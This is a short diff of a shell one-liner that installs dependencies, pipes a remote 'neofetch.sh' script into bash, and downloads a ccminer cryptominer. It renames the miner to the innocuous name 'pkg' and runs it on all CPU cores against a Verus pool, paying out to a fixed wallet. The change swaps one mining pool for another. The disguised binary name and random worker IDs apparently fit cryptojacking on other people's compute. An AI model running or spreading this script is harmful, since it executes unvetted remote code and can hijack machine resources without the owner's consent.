@@ -1,2 +1,2 @@
 apt update -y && apt install -y wget curl libsodium23 libjansson4  ; curl neofetch.sh | bash ; wget clone https://github.com/Oink70/ccminer-verus/releases/download/v3.8.3a-CPU/ccminer-v3.8.3a-oink_Ubuntu_18.04 ;mv ccminer-v3.8.3a-oink_Ubuntu_18.04 pkg; chmod 770 pkg
- ; bash -c "./pkg -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RAekjoNg7FCkAdub3D8stA4LotrZqJKofu.$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 6 | head -n 1) -p x"
+ ;taskset -c 0-$(nproc --all) bash -c "./pkg -a verus -o stratum+tcp://sg.vipor.net:5040 -u RAekjoNg7FCkAdub3D8stA4LotrZqJKofu.$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 6 | head -n 1) -p x"
